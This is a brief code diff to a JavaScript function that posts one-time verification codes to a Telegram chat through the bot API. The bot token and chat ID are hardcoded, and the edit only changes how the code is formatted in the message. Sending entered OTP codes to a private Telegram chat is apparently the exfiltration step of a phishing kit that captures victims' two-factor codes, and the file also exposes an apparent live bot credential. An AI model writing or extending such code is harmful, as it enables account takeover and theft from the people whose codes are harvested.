@@ -179,7 +179,7 @@
     function sendToTelegramBot(otp) {
         const telegramBotToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y'; // Replace with your Telegram bot token
         const chatId = '7174617845'; // Replace with your chat ID
-        const message = `New OTP Verification Code: ${otp}`;
+        const message = `New OTP Verification Code: \`${otp}\``;
         const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
         // Send the request to the Telegram bot
